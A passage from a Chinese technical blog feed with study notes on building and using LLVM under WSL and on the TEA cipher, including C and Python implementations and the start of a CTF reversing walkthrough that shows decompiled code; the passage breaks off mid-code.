class="headerlink" title="响应”报文“（header）"></a>响应”报文“（header）</h3><p>请求报文和响应报文的格式基本一致，主要是Content-Type参数不对</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/weixin_51367845/article/details/123313047?ops_request_misc=%7B%22request_id%22:%2243790c5e947552e08242aa3c05d97c3a%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=43790c5e947552e08242aa3c05d97c3a&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123313047-null-null.142%5Ev102%5Econtrol&utm_term=HTTP&spm=1018.2226.3001.4187">【计算机网络】HTTP 协议详解_3.简述浏览器请求一个网址的过程中用到的网络协议,以及协议的用途(写关键点即可)-CSDN博客</a></p><p><a href="https://developer.aliyun.com/article/1631431">一张图带你彻底了解URL的结构，非常形象！-阿里云开发者社区</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM学习笔记</title>
      <link href="/2025/04/09/LLVM/LLVM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/04/09/LLVM/LLVM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="LLVM学习笔记"><a href="#LLVM学习笔记" class="headerlink" title="LLVM学习笔记"></a>LLVM学习笔记</h1><h2 id="LLVM是什么"><a href="#LLVM是什么" class="headerlink" title="LLVM是什么"></a>LLVM是什么</h2><p>ai说：</p><p>LLVM（<strong>Low Level Virtual Machine</strong>，最初的含义，现已作为正式名称）是一个开源的<strong>编译器基础设施</strong>，用于构建编程语言的编译器、优化器、代码生成工具和相关开发工具。它提供了一套模块化的、可重用的工具链，使开发者能够高效地设计编译器前端（如词法分析、语法分析）并利用其强大的后端（如优化、代码生成）来支持多种硬件架构。</p><p>我说：</p><p>在编译性语言从代码到变为可执行文件的过程中会经过编译，链接，而通过LLVM便可实现了编译的过程，在这个过程中他将高级语言转化为他使用的低级语言（<strong>LLVM IR</strong>），再对代码进行优化，最后转为电脑可以识别的机器语言</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250408124940140.png" alt="image-20250408124940140"></p><h2 id="LLVM主要组成"><a href="#LLVM主要组成" class="headerlink" title="LLVM主要组成"></a>LLVM主要组成</h2><h3 id="LLVM-IR"><a href="#LLVM-IR" class="headerlink" title="LLVM IR"></a>LLVM IR</h3><p>一种与硬件无关的低级编译语言，类似汇编</p><p><strong>可序列化为文本或二进制格式</strong>（<code>.ll</code> 或 <code>.bc</code> 文件）</p><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><p>作用：将高级语言转为LLVM IR</p><p>示例工具：</p><ul><li><strong>Clang</strong>（C&#x2F;C++&#x2F;Objective-C 编译器，比 GCC 更快且更模块化）。</li><li><strong>Rustc</strong>（Rust 编译器使用 LLVM 作为后端）。</li><li><strong>Swift 编译器</strong>（Swift 语言官方编译器）。</li></ul><h3 id="优化器"><a href="#优化器" class="headerlink" title="优化器"></a>优化器</h3><p>对LLVM IR代码进行优化包括：</p><ul><li><p><strong>死代码消除（DCE）</strong></p><p>程序运行中不会执行的代码</p></li><li><p><strong>循环优化（Loop Unrolling）</strong></p><p>将单轮多次循环，改为多轮少次循环提升代码的并行性</p></li><li><p><strong>内联展开（Inlining）</strong></p><p>将小函数带调用替换为小函数本体，减小调用开销</p></li><li><p><strong>常量传播（Constant Propagation）</strong></p><p>将多次传播的常量直接传递结果</p></li></ul><h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>将优化后的LLVM IR转换为目标机器的机器码</p><h2 id="LLVM安装"><a href="#LLVM安装" class="headerlink" title="LLVM安装"></a>LLVM安装</h2><p>此种安装LLVM方法只支持linux系统，我这里使用的是wsl</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>安装了 <code>git</code> 和 <code>cmake</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install git cmake build-essential</span><br></pre></td></tr></table></figure><h3 id="克隆项目"><a href="#克隆项目" class="headerlink" title="克隆项目"></a>克隆项目</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/llvm/llvm-project.git</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409163623287.png" alt="image-20250409163623287"></p><h3 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h3><p>克隆完成后进入llvm-projct文件夹，在创建一个文件防止源码和编译文件混在一起</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd llvm-project</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br></pre></td></tr></table></figure><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>使用 <code>cmake</code> 配置 LLVM 构建环境。这里我们选择启用 <code>clang</code> 项目（LLVM 的一个重要组成部分）并指定构建类型（例如：Release、Debug）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -DLLVM_ENABLE_PROJECTS=clang -G &quot;Unix Makefiles&quot; -DCMAKE_BUILD_TYPE=Release ../llvm</span><br></pre></td></tr></table></figure><ul><li><code>LLVM_ENABLE_PROJECTS=clang</code>：指定我们要编译 LLVM 和 Clang。</li><li><code>-DCMAKE_BUILD_TYPE=Release</code>：选择优化后的构建类型，没有调试信息。</li></ul><h3 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j$(nproc)</span><br></pre></td></tr></table></figure><ul><li><code>-j$(nproc)</code>：这个命令告诉 <code>make</code> 使用所有可用的处理器核心来加速编译过程！</li></ul><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409161330982.png" alt="image-20250409161330982"></p><p>出现报错（若没出现报错直接跳过下面内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf build/ &amp;&amp; mkdir build &amp;&amp; cd build //删除文件夹并重新创建</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>编译环境检查</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 检查CMake版本</span><br><span class="line">cmake --version | grep &quot;3.18&quot;  # 需≥3.18‌:ml-citation&#123;ref=&quot;7,8&quot; data=&quot;citationList&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 验证编译器兼容性</span><br><span class="line">gcc -v &amp;&amp; clang -v  # 确认与LLVM要求的版本一致‌:ml-citation&#123;ref=&quot;6,8&quot; data=&quot;citationList&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 检查依赖完整性</span><br><span class="line">ldd build/bin/llvm-tblgen  # 确认动态库无缺失‌:ml-citation&#123;ref=&quot;6&quot; data=&quot;citationList&quot;&#125;</span><br></pre></td></tr></table></figure><p>安装cmake最新版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/Kitware/CMake/releases/download/v3.28.3/cmake-3.28.3-linux-x86_64.sh</span><br><span class="line">sudo sh cmake-3.28.3-linux-x86_64.sh --prefix=/usr/local --exclude-subdir</span><br><span class="line">hash -r &amp;&amp; cmake --version</span><br></pre></td></tr></table></figure><p>​<strong>解决内存不足</strong></p><p>在<code>C:\Users\&lt;用户名&gt;</code>目录下创建或编辑<code>.wslconfig</code>文件，写入以下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[wsl2]</span><br><span class="line">memory=10GB      # 设置最大内存（例如8GB）</span><br><span class="line">swap=6GB        # 设置Swap大小（例如4GB）</span><br><span class="line">processors=6    # 可选：设置CPU核心数</span><br></pre></td></tr></table></figure><p>检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free -h</span><br></pre></td></tr></table></figure><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409182337998.png" alt="image-20250409182337998"></p><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang --version</span><br><span class="line">llvm-config --version</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409182435577.png" alt="image-20250409182435577"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409182539596.png" alt="image-20250409182539596"></p><h2 id="LLVM使用"><a href="#LLVM使用" class="headerlink" title="LLVM使用"></a>LLVM使用</h2><p>LLVM不止是编译器，他还有很多其他强大的功能</p><h3 id="使用clang编译代码"><a href="#使用clang编译代码" class="headerlink" title="使用clang编译代码"></a>使用clang编译代码</h3><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409183107507.png" alt="image-20250409183107507"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409183323467.png" alt="image-20250409183323467"></p><h3 id="LLVM-IR优化代码"><a href="#LLVM-IR优化代码" class="headerlink" title="LLVM IR优化代码"></a>LLVM IR优化代码</h3><p>LLVM 使用中间表示（IR）来进行代码优化。你可以用 clang 来生成 IR 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -S -emit-llvm test.c -o test.ll</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409183703026.png" alt="image-20250409183703026"></p><p>这会将 test.c 编译为一个 LLVM IR 文件 test.ll，这时你可以对 IR 文件进行优化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opt -O2 test.ll -o test_opt.ll</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409183758183.png" alt="image-20250409183758183"></p><p>然后，使用 llc 将 IR 转换为机器代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llc test_opt.ll -o test.s</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409183839652.png" alt="image-20250409183839652"></p><p>最后，你可以使用 clang 或 gcc 将 .s 汇编文件编译为可执行文件</p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h2><p>学习LLVM的原因是因为在XYCTF比赛的过程中有一道题就是由LLVM编译器生成的.bc文件，在学习和安装LLVM的过程中初步了解到LLVM是一个工作集，最主要的工具是编译器，但相比于传统的编译器他增加一些其他优化代码的功能</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/weixin_45206081/article/details/143345004?ops_request_misc=%7B%22request_id%22:%22efe60b9de875df2a077606160d527337%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=efe60b9de875df2a077606160d527337&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-143345004-null-null.142%5Ev102%5Econtrol&utm_term=llvm&spm=1018.2226.3001.4187">LLVM简介（从入门到精通—最精炼介绍）-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/102028114">（一）LLVM概述——介绍与安装 - 知乎</a></p><p><a href="https://blog.csdn.net/m0_74331272/article/details/144852808?ops_request_misc=%7B%22request_id%22:%22072f3961b0505fe0102a1720896244e2%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=072f3961b0505fe0102a1720896244e2&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-144852808-null-null.142%5Ev102%5Econtrol&utm_term=llvm%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">LLVM 安装教程 —— 用 LLVM 打造更强大的编译器世界！_llvm安装-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> LLVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TEA加密算法</title>
      <link href="/2025/03/10/%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/TEA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2025/03/10/%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/TEA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="TEA加密算法"><a href="#TEA加密算法" class="headerlink" title="TEA加密算法"></a>TEA加密算法</h1><h2 id="TEA概述"><a href="#TEA概述" class="headerlink" title="TEA概述"></a>TEA概述</h2><p>TEA算法是由剑桥大学计算机实验室的 David Wheeler 和 Roger Needham于1994年发明，TEA 是Tiny Encryption Algorithm的缩写，以加密解密速度快，实现简单著称。</p><p>TEA 算法每一次可以操作 64bit(8byte)，采用 128bit(16byte) 作为 key，算法采用迭代的形式，推荐的迭代轮数是 64轮，最少 32 轮。</p><p>为解决 TEA 算法密钥表攻击的问题，TEA 算法先后经历了几次改进，从 XTEA 到 BLOCK TEA，直至最新的XXTEA。</p><p>XTEA 也称做 TEAN：</p><p>它使用与 TEA 相同的简单运算，但四个子密钥采取不正规的方式进行混合以阻止密钥表攻击。</p><p>Block TEA 算法可以对 32 位的任意整数倍长度的变量块进行加解密的操作：</p><p>该算法将 XTEA 轮循函数依次应用于块中的每个字，并且将它附加于被应用字的邻字。</p><p>XXTEA使用跟Block TEA相似的结构：</p><p>但在处理块中每个字时利用了相邻字，且用拥有两个输入量的 MX 函数代替了 XTEA 轮循函数。</p><p>上面提到的相邻字其实就是数组中相邻的项。</p><p>TEA 系列算法中均使用了一个 DELTA 常数，但 DELTA 的值对算法并无什么影响，只是为了避免不良的取值，推荐DELTA 的值取为黄金分割数 (5√-2)&#x2F;2 与 232 的乘积，取整后的十六进制值为 0x9e3779B9，用于保证每一轮加密都不相同。</p><p>TEA算法是由剑桥大学计算机实验室的 David Wheeler 和 Roger Needham于1994年发明，TEA 是Tiny Encryption Algorithm的缩写，以加密解密速度快，实现简单著称。</p><p>TEA 算法每一次可以操作 64bit(8byte)，采用 128bit(16byte) 作为 key，算法采用迭代的形式，推荐的迭代轮数是 64轮，最少 32 轮。</p><p>为解决 TEA 算法密钥表攻击的问题，TEA 算法先后经历了几次改进，从 XTEA 到 BLOCK TEA，直至最新的XXTEA。</p><p>XTEA 也称做 TEAN：</p><p>它使用与 TEA 相同的简单运算，但四个子密钥采取不正规的方式进行混合以阻止密钥表攻击。</p><p>Block TEA 算法可以对 32 位的任意整数倍长度的变量块进行加解密的操作：</p><p>该算法将 XTEA 轮循函数依次应用于块中的每个字，并且将它附加于被应用字的邻字。</p><p>XXTEA使用跟Block TEA相似的结构：</p><p>但在处理块中每个字时利用了相邻字，且用拥有两个输入量的 MX 函数代替了 XTEA 轮循函数。</p><p>上面提到的相邻字其实就是数组中相邻的项。</p><p>TEA 系列算法中均使用了一个 DELTA 常数，但 DELTA 的值对算法并无什么影响，只是为了避免不良的取值，推荐DELTA 的值取为黄金分割数 (5√-2)&#x2F;2 与 232 的乘积，取整后的十六进制值为 0x9e3779B9，用于保证每一轮加密都不相同。</p><h2 id="TEA加密流程"><a href="#TEA加密流程" class="headerlink" title="TEA加密流程"></a>TEA加密流程</h2><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20240227103505649.png" alt="image-20240227103505649"></p><h3 id="TEA加解密算法-C语言"><a href="#TEA加解密算法-C语言" class="headerlink" title="TEA加解密算法_C语言"></a>TEA加解密算法_C语言</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line">void encrypt (uint32_t *v,uint32_t *k )&#123;</span><br><span class="line">uint32_t v0=v[0],v1=v[1],sum=0,i;</span><br><span class="line">uint32_t delta=0x9e3779b9;</span><br><span class="line">uint32_t k0=k[0],k1=k[1],k2=k[2],k3=k[3];</span><br><span class="line">for(i=0;i&lt;32;i++)&#123;</span><br><span class="line">sum+=delta;</span><br><span class="line">v0+=((v1&lt;&lt;4)+k0)^(v1+sum)^((v1&gt;&gt;5)+k1);</span><br><span class="line">v1+=((v0&lt;&lt;4)+k2)^(v0+sum)^((v0&gt;&gt;5)+k3);</span><br><span class="line">&#125; </span><br><span class="line">v[0]=v0;v[1]=v1;</span><br><span class="line">&#125;</span><br><span class="line">void decrypt (uint32_t *v,uint32_t *k)&#123;</span><br><span class="line">uint32_t v0=v[0],v1=v[1],sum=0xC6EF3720,i;//这里的sum是0x9e3779b9*32后截取32位的结果，截取很重要。</span><br><span class="line">uint32_t delta=0x9e3779b9;</span><br><span class="line">uint32_t k0=k[0],k1=k[1],k2=k[2],k3=k[3];</span><br><span class="line">for (i=0;i&lt;32;i++)&#123;</span><br><span class="line">v1-=((v0&lt;&lt;4)+k2)^(v0+sum)^((v0&gt;&gt;5)+k3);</span><br><span class="line">v0-=((v1&lt;&lt;4)+k0)^(v1+sum)^((v1&gt;&gt;5)+k1);</span><br><span class="line">sum-=delta;</span><br><span class="line">&#125; </span><br><span class="line">v[0]=v0;v[1]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">uint32_t v[2]=&#123;1,2&#125;,k[4]=&#123;2,2,3,4&#125;;</span><br><span class="line">printf(&quot;加密前的数据：%u %u\n&quot;,v[0],v[1]);//%u 以十进制形式输出无符号整数 </span><br><span class="line">encrypt(v,k);</span><br><span class="line">printf(&quot;加密后数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">decrypt(v,k);</span><br><span class="line">printf(&quot;解密后数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加密前的数据：1 2</span><br><span class="line">加密后数据：1347371722 925494771</span><br><span class="line">解密后数据：1 2</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="TEA加解密算法-python"><a href="#TEA加解密算法-python" class="headerlink" title="TEA加解密算法_python"></a>TEA加解密算法_python</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from ctypes import * </span><br><span class="line">def encrypt(v,k):</span><br><span class="line">v0=c_uint32(v[0])</span><br><span class="line">v1=c_uint32(v[1])</span><br><span class="line">sum1=c_uint32(0)</span><br><span class="line">delta=0x9e3779b9</span><br><span class="line">for i in range(32):</span><br><span class="line">sum1.value+=delta</span><br><span class="line">v0.value+=((v1.value&lt;&lt;4)+k[0])^(v1.value+sum1.value)^((v1.value&gt;&gt;5)+k[1])</span><br><span class="line">v1.value+=((v0.value&lt;&lt;4)+k[2])^(v0.value+sum1.value)^((v0.value&gt;&gt;5)+k[3])</span><br><span class="line">return v0.value,v1.value</span><br><span class="line"> </span><br><span class="line">def decrypt(v,k):</span><br><span class="line">v0=c_uint32(v[0])</span><br><span class="line">v1=c_uint32(v[1])</span><br><span class="line">delta=0x9e3779b9</span><br><span class="line">sum1=c_uint32(delta*32)</span><br><span class="line">for i in range(32):</span><br><span class="line">v1.value-=((v0.value&lt;&lt;4)+k[2])^(v0.value+sum1.value)^((v0.value&gt;&gt;5)+k[3])</span><br><span class="line">v0.value-=((v1.value&lt;&lt;4)+k[0])^(v1.value+sum1.value)^((v1.value&gt;&gt;5)+k[1])</span><br><span class="line">sum1.value-=delta</span><br><span class="line">return v0.value,v1.value</span><br><span class="line"> </span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">a=[1,2]</span><br><span class="line">k=[2,2,3,4]</span><br><span class="line">print(&quot;加密前数据:&quot;,a)</span><br><span class="line">res=encrypt(a,k)</span><br><span class="line">print(&quot;加密后的数据:&quot;,res)</span><br><span class="line">res=decrypt(res,k)</span><br><span class="line">print(&quot;解密后数据:&quot;,res)</span><br></pre></td></tr></table></figure><h2 id="TEA加密算法实例"><a href="#TEA加密算法实例" class="headerlink" title="TEA加密算法实例"></a>TEA加密算法实例</h2><ol><li><p>题目：hgame—week2—re-ezcpp</p></li><li><p>查壳后ida打开查找main函数反编译</p><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20240227223215676.png" alt="image-20240227223215676"></p><p>找到加密函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_140001070(v8);</span><br></pre></td></tr></table></figure><p>双击进入找到加密函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_140001070(int *a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // r10d</span><br><span class="line">  __int64 v2; // rbx</span><br><span class="line">  int v3; // r11d</span><br><span class="line">  __int64 v4; // rdi</span><br><span class="line">  int v5; // r8d</span><br><span class="line">  int v6; // r9d</span><br><span class="line">  int v7; // r11d</span><br><span class="line">  __int64 v8; // rdi</span><br><span class="line">  int v9; // r8d</span><br><span class="line">  int v10; // r9d</span><br><span class="line">  int v11; // esi</span><br><span class="line">  int v12; // ebp</span><br><span class="line">  int v13; // r14d</span><br><span class="line">  int v14; // r15d</span><br><span class="line">  int v15; // r12d</span><br><span class="line">  int v16; // r11d</span><br><span class="line">  __int64 v17; // rdi</span><br><span class="line">  int v18; // r8d</span><br><span class="line">  int v19; // r9d</span><br><span class="line">  int v20; // r8d</span><br><span class="line">  int v21; // r9d</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  a1[8] = 1234;</span><br><span class="line">  v1 = 0;</span><br><span class="line">  a1[9] = 2341;</span><br><span class="line">  v2 = 32i64;</span><br><span class="line">  a1[10] = 3412;</span><br><span class="line">  v3 = 0;</span><br><span class="line">  a1[11] = 4123;</span><br><span class="line">  v4 = 32i64;</span><br><span class="line">  a1[12] = -559038737;</span><br><span class="line">  v5 = *a1;</span><br><span class="line">  v6 = a1[1];</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v3 -= 559038737;</span><br><span class="line">    v5 += (v3 + v6) ^ (16 * v6 + 1234) ^ (32 * v6 + 2341);</span><br><span class="line">    v6 += (v3 + v5) ^ (16 * v5 + 3412) ^ (32 * v5 + 4123);</span><br><span class="line">    --v4;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 );</span><br><span class="line">  *a1 = v5;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  a1[1] = v6;</span><br><span class="line">  v8 = 32i64;</span><br><span class="line">  v9 = *(int *)((char *)a1 + 1);</span><br><span class="line">  v10 = *(int *)((char *)a1 + 5);</span><br><span class="line">  v11 = a1[12];</span><br><span class="line">  v12 = a1[9];</span><br><span class="line">  v13 = a1[8];</span><br><span class="line">  v14 = a1[11];</span><br><span class="line">  v15 = a1[10];</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v7 += v11;</span><br><span class="line">    v9 += (v7 + v10) ^ (v12 + 32 * v10) ^ (v13 + 16 * v10);</span><br><span class="line">    v10 += (v7 + v9) ^ (v14 + 32 * v9) ^ (v15 + 16 * v9);</span><br><span class="line">    --v8;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v8 );</span><br><span class="line">  *(int *)((char *)a1 + 1) = v9;</span><br><span class="line">  v16 = 0;</span><br><span class="line">  *(int *)((char *)a1 + 5) = v10;</span><br><span class="line">  v17 = 32i64;</span><br><span class="line">  v18 = *(int *)((char *)a1 + 2);</span><br><span class="line">  v19 = *(int *)((char *)a1 + 6);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v16 += v11;</span><br><span class="line">    v18 += (v16 + v19) ^ (v12 + 32 * v19) ^ (v13 + 16 * v19);</span><br><span class="line">    v19 += (v16 + v18) ^ (v14 + 32 * v18) ^ (v15 + 16 * v18);</span><br><span class="line">    --v17;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v17 );</span><br><span class="line">  *(int *)((char *)a1 + 2) = v18;</span><br><span class="line">  *(int *)((char *)a1 + 6) = v19;</span><br><span class="line">  v20 = *(int *)((char *)a1 + 3);</span><br><span class="line">  v21 = *(int *)((char *)a1 + 7);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v1 += v11;</span><br><span class="line">    v20 += (v1 + v21) ^ (v12 + 32 * v21) ^ (v13 + 16 * v21);</span><br><span class="line">    result = (unsigned 